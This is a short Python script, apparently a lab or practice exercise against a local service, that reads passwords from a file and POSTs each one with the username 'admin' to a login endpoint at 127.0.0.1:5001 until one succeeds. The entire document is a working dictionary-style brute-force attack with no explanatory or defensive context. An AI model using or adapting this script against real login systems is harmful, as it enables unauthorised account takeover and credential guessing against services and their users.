import requests

with open('ps.txt') as f:
    pss = f.readlines()


def get_pass():
    global i
    if i < len(pss):
        p = pss[i]
        i += 1
        return p
    else:
        return None


i = 0

while True:
    ps = get_pass()
    if ps is None:
        break
    password = ps[:-1]
    data = {'login': 'admin', 'password': password}
    r = requests.post('http://127.0.0.1:5001/auth', json=data)
    if r.status_code == 200:
        print('Success!!', ps)
        break
